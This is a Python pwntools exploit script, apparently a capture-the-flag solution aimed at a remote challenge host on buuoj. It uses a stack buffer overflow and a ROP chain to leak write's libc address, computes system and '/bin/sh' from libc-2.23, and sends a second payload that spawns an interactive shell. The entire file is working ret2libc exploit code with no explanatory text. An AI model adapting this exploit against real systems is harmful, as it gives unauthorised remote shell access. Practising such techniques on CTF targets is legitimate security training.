from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
#context(os='linux', arch='i386', kernel='i386',log_level='debug')

elf=ELF('./pwn')
context.binary=elf
context.log_level='debug'
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',27482)
#gdb.attach(io)
#pause()
libc=ELF('./libc-2.23.so')
elf=ELF('./pwn')
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive



write_plt=elf.plt['write']
write_got=elf.got['write']

main=0x8048470
payload=b'a'*(0x88+4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
sl(payload)



#addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
#ru(b'0x')

addr=u32(io.recvuntil(b'\xf7')[-4:])
#ru(b'0x')
#rbp= int(io.recv(12).rjust(16,b'0'),16)
#print(hex(rbp))

print(hex(addr))

#ru(b'Hello, World!\n')

#libc=LibcSearcher('read',addr)
#libc_base_addr=addr-libc.dump('read')
#system_addr=libc_base_addr+libc.dump('system')
#bin_sh_addr=libc_base_addr+libc.dump('str_bin_sh')


libc_base_addr=addr-libc.sym['write']
system_addr=libc_base_addr+ libc.sym['system']    
bin_sh_addr=libc_base_addr+ next(libc.search(b'/bin/sh\x00'))

payload2=b'a'*(0x88+4)+p32(system_addr)+b'aaaa'+p32(bin_sh_addr)

sl(payload2)






ii()
